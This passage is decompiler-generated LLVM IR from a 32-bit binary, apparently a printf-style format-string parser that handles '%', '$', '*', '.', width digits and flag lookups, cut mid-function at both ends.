  %v0_804e9fc138 = phi i32 [ %v1_804e9fc, %dec_label_pc_804e9fc ], [ %v0_804e9fd.pre, %dec_label_pc_804e9e3 ]
  %v1_804e9f5137 = phi i32 [ %v0_804ea1732, %dec_label_pc_804e9fc ], [ 0, %dec_label_pc_804e9e3 ]
  %v1_804e9ed = add i32 %v1_804e9f5137, -4094
  %v6_804e9ed = sub i32 4093, %v1_804e9f5137
  %v7_804e9ed = and i32 %v6_804e9ed, %v1_804e9f5137
  %v8_804e9ed = icmp slt i32 %v7_804e9ed, 0
  %v9_804e9ed = icmp eq i32 %v1_804e9ed, 0
  %v10_804e9ed = icmp slt i32 %v1_804e9ed, 0
  %v3_804e9f3 = icmp eq i1 %v10_804e9ed, %v8_804e9ed
  %v4_804e9f3 = icmp eq i1 %v9_804e9ed, false
  %v5_804e9f3 = and i1 %v4_804e9f3, %v3_804e9f3
  br i1 %v5_804e9f3, label %dec_label_pc_804e9fc, label %dec_label_pc_804e9f5

dec_label_pc_804e9f5:                             ; preds = %dec_label_pc_804e9ed
  %v3_804e9f5 = mul i32 %v1_804e9f5137, 10
  store i32 %v3_804e9f5, i32* %eax.global-to-local, align 4
  %v2_804e9f8 = add i32 %v3_804e9f5, -48
  %v3_804e9f8 = add i32 %v2_804e9f8, %v2_804e9ff140
  store i32 %v3_804e9f8, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e9fc

dec_label_pc_804e9fc:                             ; preds = %dec_label_pc_804e9ed, %dec_label_pc_804e9f5
  %v0_804ea1732 = phi i32 [ %v1_804e9f5137, %dec_label_pc_804e9ed ], [ %v3_804e9f8, %dec_label_pc_804e9f5 ]
  %v4_804e9fd28 = phi i32 [ %v6_804e9fd139, %dec_label_pc_804e9ed ], [ %v3_804e9f5, %dec_label_pc_804e9f5 ]
  %v1_804e9fc = add i32 %v0_804e9fc138, 1
  store i32 %v1_804e9fc, i32* @esi, align 4
  %v1_804e9fd = inttoptr i32 %v1_804e9fc to i8*
  %v2_804e9fd = load i8, i8* %v1_804e9fd, align 1
  %v3_804e9fd = zext i8 %v2_804e9fd to i32
  %v5_804e9fd = and i32 %v4_804e9fd28, -256
  %v6_804e9fd = or i32 %v3_804e9fd, %v5_804e9fd
  store i32 %v6_804e9fd, i32* %eax.global-to-local, align 4
  %v2_804e9ff = sext i8 %v2_804e9fd to i32
  store i32 %v2_804e9ff, i32* @ecx, align 4
  %v2_804ea02 = mul nsw i32 %v2_804e9ff, 2
  %v3_804ea02 = add i32 %v2_804ea02, %v0_804e9e5
  %v4_804ea02 = inttoptr i32 %v3_804ea02 to i8*
  %v5_804ea02 = load i8, i8* %v4_804ea02, align 1
  %v6_804ea02 = and i8 %v5_804ea02, 8
  %v7_804ea02 = icmp eq i8 %v6_804ea02, 0
  %v1_804ea07 = icmp eq i1 %v7_804ea02, false
  br i1 %v1_804ea07, label %dec_label_pc_804e9ed, label %dec_label_pc_804ea09

dec_label_pc_804ea09:                             ; preds = %dec_label_pc_804e9fc, %dec_label_pc_804e9e3
  %v1_804e9f5.lcssa = phi i32 [ 0, %dec_label_pc_804e9e3 ], [ %v0_804ea1732, %dec_label_pc_804e9fc ]
  %v0_804e9fc.lcssa = phi i32 [ %v0_804e9fd.pre, %dec_label_pc_804e9e3 ], [ %v1_804e9fc, %dec_label_pc_804e9fc ]
  %v2_804e9fd.lcssa = phi i8 [ %v2_804e9fd125, %dec_label_pc_804e9e3 ], [ %v2_804e9fd, %dec_label_pc_804e9fc ]
  %v6_804e9fd.lcssa = phi i32 [ %v6_804e9fd128, %dec_label_pc_804e9e3 ], [ %v6_804e9fd, %dec_label_pc_804e9fc ]
  %v0_804ea09 = load i32, i32* @edx, align 4
  %v1_804ea09 = add i32 %v0_804ea09, -1
  %v2_804ea09 = inttoptr i32 %v1_804ea09 to i8*
  %v3_804ea09 = load i8, i8* %v2_804ea09, align 1
  %v12_804ea09 = icmp eq i8 %v3_804ea09, 37
  %v1_804ea0d = icmp eq i1 %v12_804ea09, false
  br i1 %v1_804ea0d, label %dec_label_pc_804eaa0, label %dec_label_pc_804ea13

dec_label_pc_804ea13:                             ; preds = %dec_label_pc_804ea09
  %v10_804ea13 = icmp eq i8 %v2_804e9fd.lcssa, 36
  %v1_804ea15 = icmp eq i1 %v10_804ea13, false
  br i1 %v1_804ea15, label %dec_label_pc_804ea47, label %dec_label_pc_804ea17

dec_label_pc_804ea17:                             ; preds = %dec_label_pc_804ea13
  %tmp89 = icmp slt i32 %v1_804e9f5.lcssa, 1
  br i1 %tmp89, label %dec_label_pc_804ea47, label %dec_label_pc_804ea1b

dec_label_pc_804ea1b:                             ; preds = %dec_label_pc_804ea17
  %v1_804ea1b = add i32 %v0_804e9fc.lcssa, 1
  store i32 %v1_804ea1b, i32* @edx, align 4
  %v4_804ea1e = icmp eq i32 %stack_var_-88.1, 0
  br i1 %v4_804ea1e, label %dec_label_pc_804ece8, label %dec_label_pc_804ea29

dec_label_pc_804ea29:                             ; preds = %dec_label_pc_804ea1b
  store i32 %stack_var_-88.1, i32* %ecx.global-to-local, align 4
  %v2_804ea31 = sub i32 %v1_804e9f5.lcssa, %stack_var_-88.1
  %v8_804ea31 = xor i32 %v1_804e9f5.lcssa, %stack_var_-88.1
  %v9_804ea31 = xor i32 %v2_804ea31, %v1_804e9f5.lcssa
  %v10_804ea31 = and i32 %v9_804ea31, %v8_804ea31
  %v11_804ea31 = icmp slt i32 %v10_804ea31, 0
  %v12_804ea31 = icmp eq i32 %v2_804ea31, 0
  %v13_804ea31 = icmp slt i32 %v2_804ea31, 0
  %v3_804ea33 = icmp ne i1 %v13_804ea31, %v11_804ea31
  %v4_804ea33 = or i1 %v12_804ea31, %v3_804ea33
  %stack_var_-88.1.v0_804ea35 = select i1 %v4_804ea33, i32 %stack_var_-88.1, i32 %v1_804e9f5.lcssa
  br label %dec_label_pc_804ea43

dec_label_pc_804ea43:                             ; preds = %dec_label_pc_804ea57, %dec_label_pc_804ea29, %dec_label_pc_804ea5b
  %v0_804ea43 = phi i32 [ %v1_804ea1b, %dec_label_pc_804ea29 ], [ %v0_804ea09, %dec_label_pc_804ea5b ], [ %v0_804ea09, %dec_label_pc_804ea57 ]
  %stack_var_-32.2 = phi i32 [ %v1_804e9f5.lcssa, %dec_label_pc_804ea29 ], [ %stack_var_-32.1, %dec_label_pc_804ea5b ], [ %stack_var_-32.1, %dec_label_pc_804ea57 ]
  %stack_var_-88.2 = phi i32 [ %stack_var_-88.1.v0_804ea35, %dec_label_pc_804ea29 ], [ 0, %dec_label_pc_804ea5b ], [ 0, %dec_label_pc_804ea57 ]
  store i32 %v0_804ea43, i32* @esi, align 4
  br label %dec_label_pc_804ea6a

dec_label_pc_804ea47:                             ; preds = %dec_label_pc_804ea17, %dec_label_pc_804ea13
  %tmp90 = icmp slt i32 %stack_var_-88.1, 1
  br i1 %tmp90, label %dec_label_pc_804ea57, label %dec_label_pc_804ea4e

dec_label_pc_804ea4e:                             ; preds = %dec_label_pc_804ea47
  %v10_804ea4e = icmp eq i8 %v2_804e9fd.lcssa, 109
  br i1 %v10_804ea4e, label %dec_label_pc_804eaa0, label %dec_label_pc_804ece8

dec_label_pc_804ea57:                             ; preds = %dec_label_pc_804ea47
  %tmp176 = icmp ugt i32 %v0_804e9fc.lcssa, %v0_804ea09
  br i1 %tmp176, label %dec_label_pc_804ea5b, label %dec_label_pc_804ea43

dec_label_pc_804ea5b:                             ; preds = %dec_label_pc_804ea57
  %v1_804ea5b = inttoptr i32 %v0_804ea09 to i8*
  %v2_804ea5b = load i8, i8* %v1_804ea5b, align 1
  %v8_804ea5b = icmp eq i8 %v2_804ea5b, 48
  br i1 %v8_804ea5b, label %dec_label_pc_804ea43, label %dec_label_pc_804eaa0

dec_label_pc_804ea6a:                             ; preds = %dec_label_pc_804ea7b, %dec_label_pc_804ea43
  %v0_804ea96 = phi i32 [ %v1_804ea7b, %dec_label_pc_804ea7b ], [ %v0_804ea43, %dec_label_pc_804ea43 ]
  %v4_804ea7435 = phi i32 [ %v6_804ea74, %dec_label_pc_804ea7b ], [ %v6_804e9fd.lcssa, %dec_label_pc_804ea43 ]
  store i32 ptrtoint ([8 x i8]* @global_var_805624a.197 to i32), i32* %edx.global-to-local, align 4
  %v1_804ea77 = inttoptr i32 %v0_804ea96 to i8*
  br label %dec_label_pc_804ea74

dec_label_pc_804ea74:                             ; preds = %dec_label_pc_804ea85, %dec_label_pc_804ea6a
  %v4_804ea74 = phi i32 [ %v4_804ea7435, %dec_label_pc_804ea6a ], [ %v6_804ea74, %dec_label_pc_804ea85 ]
  %v0_804ea76 = phi i32 [ ptrtoint ([8 x i8]* @global_var_805624a.197 to i32), %dec_label_pc_804ea6a ], [ %v1_804ea76, %dec_label_pc_804ea85 ]
  %v0_804ea85 = phi i32 [ 1, %dec_label_pc_804ea6a ], [ %v2_804ea85, %dec_label_pc_804ea85 ]
  store i32 %v0_804ea85, i32* @ecx, align 4
  %v1_804ea74 = inttoptr i32 %v0_804ea76 to i8*
  %v2_804ea74 = load i8, i8* %v1_804ea74, align 1
  %v3_804ea74 = zext i8 %v2_804ea74 to i32
  %v5_804ea74 = and i32 %v4_804ea74, -256
  %v6_804ea74 = or i32 %v3_804ea74, %v5_804ea74
  store i32 %v6_804ea74, i32* %eax.global-to-local, align 4
  %v1_804ea76 = add i32 %v0_804ea76, 1
  store i32 %v1_804ea76, i32* @edx, align 4
  %v2_804ea77 = load i8, i8* %v1_804ea77, align 1
  %v15_804ea77 = icmp eq i8 %v2_804ea77, %v2_804ea74
  %v1_804ea79 = icmp eq i1 %v15_804ea77, false
  br i1 %v1_804ea79, label %dec_label_pc_804ea80, label %dec_label_pc_804ea7b

dec_label_pc_804ea7b:                             ; preds = %dec_label_pc_804ea74
  %v1_804ea7b = add i32 %v0_804ea96, 1
  store i32 %v1_804ea7b, i32* @esi, align 4
  %v0_804ea7c = load i32, i32* %edi.global-to-local, align 4
  %v2_804ea7c = or i32 %v0_804ea7c, %v0_804ea85
  store i32 %v2_804ea7c, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804ea6a

dec_label_pc_804ea80:                             ; preds = %dec_label_pc_804ea74
  %v1_804ea80 = inttoptr i32 %v1_804ea76 to i8*
  %v2_804ea80 = load i8, i8* %v1_804ea80, align 1
  %v3_804ea80 = icmp eq i8 %v2_804ea80, 0
  br i1 %v3_804ea80, label %dec_label_pc_804ea89, label %dec_label_pc_804ea85

dec_label_pc_804ea85:                             ; preds = %dec_label_pc_804ea80
  %v2_804ea85 = mul i32 %v0_804ea85, 2
  br label %dec_label_pc_804ea74

dec_label_pc_804ea89:                             ; preds = %dec_label_pc_804ea80
  %v0_804ea89 = load i32, i32* %edi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804ea8d = udiv i32 %v0_804ea89, 2
  %v1_804ea8d.not = or i32 %v1_804ea8d, -6
  %v1_804ea92 = xor i32 %v1_804ea8d.not, 5
  store i32 %v1_804ea92, i32* %eax.global-to-local, align 4
  %v2_804ea94 = and i32 %v1_804ea92, %v0_804ea89
  store i32 %v2_804ea94, i32* %edi.global-to-local, align 4
  %v1_804ea96 = add i32 %v0_804ea96, -1
  %v2_804ea96 = inttoptr i32 %v1_804ea96 to i8*
  %v3_804ea96 = load i8, i8* %v2_804ea96, align 1
  %v12_804ea96 = icmp eq i8 %v3_804ea96, 37
  %v1_804ea9a = icmp eq i1 %v12_804ea96, false
  br i1 %v1_804ea9a, label %dec_label_pc_804e9cc, label %dec_label_pc_804eaa0

dec_label_pc_804eaa0:                             ; preds = %dec_label_pc_804ea5b, %dec_label_pc_804ea89, %dec_label_pc_804ea09, %dec_label_pc_804ea4e
  %v0_804eac3 = phi i32 [ %v1_804e9f5.lcssa, %dec_label_pc_804ea4e ], [ %v1_804e9f5.lcssa, %dec_label_pc_804ea5b ], [ 0, %dec_label_pc_804ea89 ], [ %v1_804e9f5.lcssa, %dec_label_pc_804ea09 ]
  %v1_804eacc = phi i32 [ %v0_804e9fc.lcssa, %dec_label_pc_804ea4e ], [ %v0_804e9fc.lcssa, %dec_label_pc_804ea5b ], [ %v0_804ea96, %dec_label_pc_804ea89 ], [ %v0_804e9fc.lcssa, %dec_label_pc_804ea09 ]
  %v0_804eac9 = phi i32 [ %v0_804ea09, %dec_label_pc_804ea4e ], [ %v0_804ea09, %dec_label_pc_804ea5b ], [ %v1_804ea76, %dec_label_pc_804ea89 ], [ %v0_804ea09, %dec_label_pc_804ea09 ]
  %stack_var_-32.3 = phi i32 [ %stack_var_-32.1, %dec_label_pc_804ea4e ], [ %stack_var_-32.1, %dec_label_pc_804ea5b ], [ %stack_var_-32.2, %dec_label_pc_804ea89 ], [ %stack_var_-32.1, %dec_label_pc_804ea09 ]
  %stack_var_-88.3 = phi i32 [ %stack_var_-88.1, %dec_label_pc_804ea4e ], [ 0, %dec_label_pc_804ea5b ], [ %stack_var_-88.2, %dec_label_pc_804ea89 ], [ %stack_var_-88.1, %dec_label_pc_804ea09 ]
  %v1_804eaa0 = inttoptr i32 %v0_804eac9 to i8*
  %v2_804eaa0 = load i8, i8* %v1_804eaa0, align 1
  %v11_804eaa0 = icmp eq i8 %v2_804eaa0, 42
  %v1_804eaa3 = icmp eq i1 %v11_804eaa0, false
  br i1 %v1_804eaa3, label %dec_label_pc_804ead9, label %dec_label_pc_804eaa5

dec_label_pc_804eaa5:                             ; preds = %dec_label_pc_804eaa0
  %v4_804eaa5 = icmp eq i32 %stack_var_-88.3, 0
  br i1 %v4_804eaa5, label %dec_label_pc_804eac9, label %dec_label_pc_804eaac

dec_label_pc_804eaac:                             ; preds = %dec_label_pc_804eaa5
  %v1_804eaac = inttoptr i32 %v1_804eacc to i8*
  %v2_804eaac = load i8, i8* %v1_804eaac, align 1
  %v11_804eaac = icmp eq i8 %v2_804eaac, 36
  %v1_804eaaf = icmp eq i1 %v11_804eaac, false
  br i1 %v1_804eaaf, label %dec_label_pc_804ece8, label %dec_label_pc_804eab5

dec_label_pc_804eab5:                             ; preds = %dec_label_pc_804eaac
  %tmp91 = icmp slt i32 %v0_804eac3, 1
  br i1 %tmp91, label %dec_label_pc_804ece8, label %dec_label_pc_804eabd

dec_label_pc_804eabd:                             ; preds = %dec_label_pc_804eab5
  store i32 %v8_804e9d3, i32* %eax.global-to-local, align 4
  %v1_804eac2 = add i32 %v1_804eacc, 1
  store i32 %v1_804eac2, i32* @esi, align 4
  %v1_804eac3 = load i32, i32* @esp, align 4
  %v3_804eac3 = add i32 %v8_804e9d3, 68
  %v4_804eac3 = add i32 %v3_804eac3, %v1_804eac3
  %v5_804eac3 = inttoptr i32 %v4_804eac3 to i32*
  store i32 %v0_804eac3, i32* %v5_804eac3, align 4
  %v0_804eb07.pre.pre.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804ead4

dec_label_pc_804eac9:                             ; preds = %dec_label_pc_804eaa5
  %v1_804eac9 = add i32 %v0_804eac9, 1
  store i32 %v1_804eac9, i32* %eax.global-to-local, align 4
  %v12_804eacc = icmp eq i32 %v1_804eac9, %v1_804eacc
  %v1_804eace = icmp eq i1 %v12_804eacc, false
  br i1 %v1_804eace, label %dec_label_pc_804ece8, label %dec_label_pc_804ead4

dec_label_pc_804ead4:                             ; preds = %dec_label_pc_804eac9, %dec_label_pc_804eabd
  %v0_804eb07.pre.pre.pre = phi i32 [ %v1_804eacc, %dec_label_pc_804eac9 ], [ %v0_804eb07.pre.pre.pre.pre, %dec_label_pc_804eabd ]
  store i32 -2147483648, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804ead9

dec_label_pc_804ead9:                             ; preds = %dec_label_pc_804eaa0, %dec_label_pc_804ead4
  %v0_804eb07.pre.pre = phi i32 [ %v1_804eacc, %dec_label_pc_804eaa0 ], [ %v0_804eb07.pre.pre.pre, %dec_label_pc_804ead4 ]
  %v0_804e972 = phi i32 [ %v0_804eac3, %dec_label_pc_804eaa0 ], [ -2147483648, %dec_label_pc_804ead4 ]
  %v4_804ead9 = trunc i64 %stack_var_-92.1.ph to i32
  %v5_804ead9 = icmp eq i32 %v4_804ead9, 0
  %v1_804eade = icmp eq i1 %v5_804ead9, false
  %.pre = inttoptr i32 %v0_804eb07.pre.pre to i8*
  br i1 %v1_804eade, label %dec_label_pc_804eb02, label %dec_label_pc_804eae4

dec_label_pc_804eae4:                             ; preds = %dec_label_pc_804ead9
  %v2_804eae4 = load i8, i8* %.pre, align 1
  %v11_804eae4 = icmp eq i8 %v2_804eae4, 46
  %v1_804eae7 = icmp eq i1 %v11_804eae4, false
  br i1 %v1_804eae7, label %dec_label_pc_804eafb, label %dec_label_pc_804eae9

dec_label_pc_804eae9:                             ; preds = %dec_label_pc_804eae4
  %v1_804eae9 = add i32 %v0_804eb07.pre.pre, 1
  store i32 %v1_804eae9, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804e9cc.outer

dec_label_pc_804eafb:                             ; preds = %dec_label_pc_804eae4
  br label %dec_label_pc_804eb02

dec_label_pc_804eb02:                             ; preds = %dec_label_pc_804ead9, %dec_label_pc_804eafb
  %stack_var_-96.2 = phi i32 [ %v0_804e972, %dec_label_pc_804eafb ], [ %stack_var_-96.1.ph, %dec_label_pc_804ead9 ]
  %storemerge4 = phi i32 [ -1, %dec_label_pc_804eafb ], [ %v0_804e972, %dec_label_pc_804ead9 ]
  store i32 %storemerge4, i32* %ebp.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_80561f8.198 to i32), i32* @edx, align 4
  %v4_804eb07.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804eb07

dec_label_pc_804eb07:                             ; preds = %dec_label_pc_804eb11, %dec_label_pc_804eb02
  %v0_804eb11 = phi i32 [ %v1_804eb11, %dec_label_pc_804eb11 ], [ ptrtoint ([9 x i8]* @global_var_80561f8.198 to i32), %dec_label_pc_804eb02 ]
  %v4_804eb07 = phi i32 [ %v6_804eb07, %dec_label_pc_804eb11 ], [ %v4_804eb07.pre, %dec_label_pc_804eb02 ]
  %v2_804eb07 = load i8, i8* %.pre, align 1
  %v3_804eb07 = zext i8 %v2_804eb07 to i32
  %v5_804eb07 = and i32 %v4_804eb07, -256
  %v6_804eb07 = or i32 %v3_804eb07, %v5_804eb07
  store i32 %v6_804eb07, i32* %eax.global-to-local, align 4
  %v3_804eb09 = inttoptr i32 %v0_804eb11 to i8*
  %v4_804eb09 = load i8, i8* %v3_804eb09, align 1
  %v15_804eb09 = icmp eq i8 %v2_804eb07, %v4_804eb09
  br i1 %v15_804eb09, label %dec_label_pc_804e979, label %dec_label_pc_804eb11

dec_label_pc_804eb11:                             ; preds = %dec_label_pc_804eb07
  %v1_804eb11 = add i32 %v0_804eb11, 1
  store i32 %v1_804eb11, i32* @edx, align 4
  %v1_804eb12 = inttoptr i32 %v1_804eb11 to i8*
  %v2_804eb12 = load i8, i8* %v1_804eb12, align 1
  %v3_804eb12 = icmp eq i8 %v2_804eb12, 0
  %v1_804eb15 = icmp eq i1 %v3_804eb12, false
  br i1 %v1_804eb15, label %dec_label_pc_804eb07, label %dec_label_pc_804eb17

dec_label_pc_804eb17:                             ; preds = %dec_label_pc_804eb11, %dec_label_pc_804e979
  %v0_804eb2a = phi i32 [ %v1_804e979, %dec_label_pc_804e979 ], [ %v0_804eb07.pre.pre, %dec_label_pc_804eb11 ]
  %v0_804eb27 = phi i32 [ %v0_804eb11, %dec_label_pc_804e979 ], [ %v1_804eb11, %dec_label_pc_804eb11 ]
  %v1_804eb19 = add i32 %v0_804eb27, -134570488
  %v1_804eb1e = add i32 %v0_804eb27, -134570489
  %v5_804eb1e = sub i32 134570488, %v0_804eb27
  %v6_804eb1e = and i32 %v1_804eb19, %v5_804eb1e
  %v7_804eb1e = icmp slt i32 %v6_804eb1e, 0
  %v8_804eb1e = icmp eq i32 %v1_804eb1e, 0
  %v9_804eb1e = icmp slt i32 %v1_804eb1e, 0
  store i32 %v1_804eb1e, i32* %eax.global-to-local, align 4
  %v3_804eb1f = icmp eq i1 %v9_804eb1e, %v7_804eb1e
  %v4_804eb1f = icmp eq i1 %v8_804eb1e, false
  %v5_804eb1f = and i1 %v4_804eb1f, %v3_804eb1f
  br i1 %v5_804eb1f, label %dec_label_pc_804eb2b, label %dec_label_pc_804eb21

dec_label_pc_804eb21:                             ; preds = %dec_label_pc_804eb17
  %v1_804eb21 = inttoptr i32 %v0_804eb2a to i8*
  %v2_804eb21 = load i8, i8* %v1_804eb21, align 1
  %v3_804eb21 = zext i8 %v2_804eb21 to i32
  %v5_804eb21 = and i32 %v1_804eb1e, -256
  %v6_804eb21 = or i32 %v3_804eb21, %v5_804eb21
  store i32 %v6_804eb21, i32* %eax.global-to-local, align 4
  %v3_804eb23 = inttoptr i32 %v0_804eb27 to i8*
  %v4_804eb23 = load i8, i8* %v3_804eb23, align 1
  %v15_804eb23 = icmp eq i8 %v2_804eb21, %v4_804eb23
  %v1_804eb25 = icmp eq i1 %v15_804eb23, false
  br i1 %v1_804eb25, label %dec_label_pc_804eb2b, label %dec_label_pc_804eb27

dec_label_pc_804eb27:                             ; preds = %dec_label_pc_804eb21
  %v1_804eb27 = add i32 %v0_804eb27, 9
  store i32 %v1_804eb27, i32* @edx, align 4
  %v1_804eb2a = add i32 %v0_804eb2a, 1
  store i32 %v1_804eb2a, i32* @esi, align 4
  br label %dec_label_pc_804eb2b

dec_label_pc_804eb2b:                             ; preds = %dec_label_pc_804eb21, %dec_label_pc_804eb17, %dec_label_pc_804eb27
  %v4_804eb32 = phi i32 [ %v6_804eb21, %dec_label_pc_804eb21 ], [ %v1_804eb1e, %dec_label_pc_804eb17 ], [ %v6_804eb21, %dec_label_pc_804eb27 ]
  %v0_804eb32 = phi i32 [ %v0_804eb2a, %dec_label_pc_804eb21 ], [ %v0_804eb2a, %dec_label_pc_804eb17 ], [ %v1_804eb2a, %dec_label_pc_804eb27 ]
  %v0_804eb2b = phi i32 [ %v0_804eb27, %dec_label_pc_804eb21 ], [ %v0_804eb27, %dec_label_pc_804eb17 ], [ %v1_804eb27, %dec_label_pc_804eb27 ]
  %v1_804eb2b = add i32 %v0_804eb2b, 9
  %v2_804eb2b = inttoptr i32 %v1_804eb2b to i8*
  %v3_804eb2b = load i8, i8* %v2_804eb2b, align 1
  %v4_804eb2b = sext i8 %v3_804eb2b to i32
  %v2_804eb2f = mul nsw i32 %v4_804eb2b, 256
  store i32 %v2_804eb2f, i32* %ebx.global-to-local, align 4
  %v1_804eb32 = inttoptr i32 %v0_804eb32 to i8*
  %v2_804eb32 = load i8, i8* %v1_804eb32, align 1
  %v3_804eb32 = zext i8 %v2_804eb32 to i32
  %v5_804eb32 = and i32 %v4_804eb32, -256
  %v6_804eb32 = or i32 %v3_804eb32, %v5_804eb32
  store i32 %v6_804eb32, i32* %eax.global-to-local, align 4
  %v4_804eb34 = icmp eq i8 %v2_804eb32, 0
  br i1 %v4_804eb34, label %dec_label_pc_804ece8, label %dec_label_pc_804eb3c

dec_label_pc_804eb3c:                             ; preds = %dec_label_pc_804eb2b
  store i32 ptrtoint ([21 x i8]* @global_var_8056235.199 to i32), i32* %ecx.global-to-local, align 4
  %v3_804eb41 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804eb41, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804eb45

dec_label_pc_804eb45:                             ; preds = %dec_label_pc_804eb94, %dec_label_pc_804eb3c
  %v0_804eb94 = phi i32 [ %v1_804eb94, %dec_label_pc_804eb94 ], [ ptrtoint ([21 x i8]* @global_var_8056235.199 to i32), %dec_label_pc_804eb3c ]
  %v3_804eb45 = inttoptr i32 %v0_804eb94 to i8*
  %v4_804eb45 = load i8, i8* %v3_804eb45, align 1
  %v15_804eb45 = icmp eq i8 %v2_804eb32, %v4_804eb45
  %v1_804eb47 = icmp eq i1 %v15_804eb45, false
  br i1 %v1_804eb47, label %dec_label_pc_804eb94, label %dec_label_pc_804eb49

dec_label_pc_804eb49:                             ; preds = %dec_label_pc_804eb45
  %v1_804eb4b = add i32 %v0_804eb94, -134570549
  store i32 %v1_804eb4b, i32* %edx.global-to-local, align 4
  %v7_804eb54 = icmp sgt i32 %v1_804eb4b, 17
  br i1 %v7_804eb54, label %dec_label_pc_804eb56, label %dec_label_pc_804eb5e

dec_label_pc_804eb56:                             ; preds = %dec_label_pc_804eb49
  %v3_804eb56 = and i32 %v2_804eb2f, 1024
  %v4_804eb56 = icmp eq i32 %v3_804eb56, 0
  br i1 %v4_804eb56, label %dec_label_pc_804eb5e, label %dec_label_pc_804eb5b

dec_label_pc_804eb5b:                             ; preds = %dec_label_pc_804eb56
  %v1_804eb5b = add i32 %v0_804eb94, -134570551
  store i32 %v1_804eb5b, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804eb5e

dec_label_pc_804eb5e:                             ; preds = %dec_label_pc_804eb49, %dec_label_pc_804eb56, %dec_label_pc_804eb5b
  %v0_804eb67 = phi i32 [ %v1_804eb4b, %dec_label_pc_804eb49 ], [ %v1_804eb4b, %dec_label_pc_804eb56 ], [ %v1_804eb5b, %dec_label_pc_804eb5b ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805622b.200 to i32), i32* %ecx.global-to-local, align 4
  %v2_804eb67 = add i32 %tmp76, 32
  %v3_804eb67 = inttoptr i32 %v2_804eb67 to i32*
  store i32 %v0_804eb67, i32* %v3_804eb67, align 4
  %v0_804eb6a.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_804eb6e.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804eb6a

dec_label_pc_804eb6a:                             ; preds = %dec_label_pc_804eb6a, %dec_label_pc_804eb5e
  %v0_804eb6a = phi i32 [ %v1_804eb6a, %dec_label_pc_804eb6a ], [ %v0_804eb6a.pre, %dec_label_pc_804eb5e ]
  %v1_804eb6a = add i32 %v0_804eb6a, 1
  store i32 %v1_804eb6a, i32* %ecx.global-to-local, align 4
  %v1_804eb6b = inttoptr i32 %v1_804eb6a to i8*
  %v2_804eb6b = load i8, i8* %v1_804eb6b, align 1
  %v3_804eb6b = sext i8 %v2_804eb6b to i32
  store i32 %v3_804eb6b, i32* %eax.global-to-local, align 4
  %v8_804eb70 = icmp sgt i32 %v0_804eb6e.pre, %v3_804eb6b
  br i1 %v8_804eb70, label %dec_label_pc_804eb6a, label %dec_label_pc_804eb72

dec_label_pc_804eb72:                             ; preds = %dec_label_pc_804eb6a
  store i32 ptrtoint ([21 x i8]* @global_var_8056235.199 to i32), i32* @ecx, align 4
  %v1_804eb79 = add i32 %v0_804eb6a, -134570539
  store i32 %v1_804eb79, i32* %eax.global-to-local, align 4
  %v2_804eb7e = add i32 %v0_804eb6a, add (i32 ptrtoint (i32* @global_var_805621c.201 to i32), i32 -134570539)
  %v3_804eb7e = add i32 %v2_804eb7e, %v1_804eb79
  %v4_804eb7e = inttoptr i32 %v3_804eb7e to i16*
  %v5_804eb7e = load i16, i16* %v4_804eb7e, align 2
  %v6_804eb7e = sext i16 %v5_804eb7e to i32
  store i32 %v6_804eb7e, i32* %edx.global-to-local, align 4
  %factor = mul i32 %v1_804eb79, 2
  %v3_804eb86 = add i32 %factor, 134570508
  %v4_804eb86 = inttoptr i32 %v3_804eb86 to i16*
  %v5_804eb86 = load i16, i16* %v4_804eb86, align 2
  %v6_804eb86 = sext i16 %v5_804eb86 to i32
  store i32 %v6_804eb86, i32* %eax.global-to-local, align 4
  %v1_804eb8e = load i32, i32* %ebx.global-to-local, align 4
  %v2_804eb8e = or i32 %v1_804eb8e, %v6_804eb7e
  %v2_804eb90 = and i32 %v2_804eb8e, %v6_804eb86
  store i32 %v2_804eb90, i32* %edx.global-to-local, align 4
  %v0_804eba2.pre = load i32, i32* @esi, align 4
  %v0_804eba5.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804eb9a

dec_label_pc_804eb94:                             ; preds = %dec_label_pc_804eb45
  %v1_804eb94 = add i32 %v0_804eb94, 1
  store i32 %v1_804eb94, i32* @ecx, align 4
  %v1_804eb95 = inttoptr i32 %v1_804eb94 to i8*
  %v2_804eb95 = load i8, i8* %v1_804eb95, align 1
  %v3_804eb95 = icmp eq i8 %v2_804eb95, 0
  %v1_804eb98 = icmp eq i1 %v3_804eb95, false
  br i1 %v1_804eb98, label %dec_label_pc_804eb45, label %dec_label_pc_804eb9a

dec_label_pc_804eb9a:                             ; preds = %dec_label_pc_804eb94, %dec_label_pc_804eb72
  %v0_804eba5 = phi i32 [ %v0_804eba5.pre, %dec_label_pc_804eb72 ], [ %storemerge4, %dec_label_pc_804eb94 ]
  %v0_804eba2 = phi i32 [ %v0_804eba2.pre, %dec_label_pc_804eb72 ], [ %v0_804eb32, %dec_label_pc_804eb94 ]
  %v0_804eb9a = phi i32 [ %v2_804eb90, %dec_label_pc_804eb72 ], [ %v3_804eb41, %dec_label_pc_804eb94 ]
  store i32 %v0_804eb9a, i32* %stack_var_-20, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_804eba2 = inttoptr i32 %v0_804eba2 to i8*
  %v2_804eba2 = load i8, i8* %v1_804eba2, align 1
  %v3_804eba2 = sext i8 %v2_804eba2 to i32
  store i32 %v3_804eba2, i32* %eax.global-to-local, align 4
  %v2_804eba5 = add i32 %tmp76, 4
  %v3_804eba5 = inttoptr i32 %v2_804eba5 to i32*
  store i32 %v0_804eba5, i32* %v3_804eba5, align 4
  %v0_804eba8 = load i32, i32* %eax.global-to-local, align 4
  %v1_804eba8 = load i32, i32* @edx, align 4
  %v2_804eba8 = add i32 %v1_804eba8, 12
  %v3_804eba8 = inttoptr i32 %v2_804eba8 to i32*
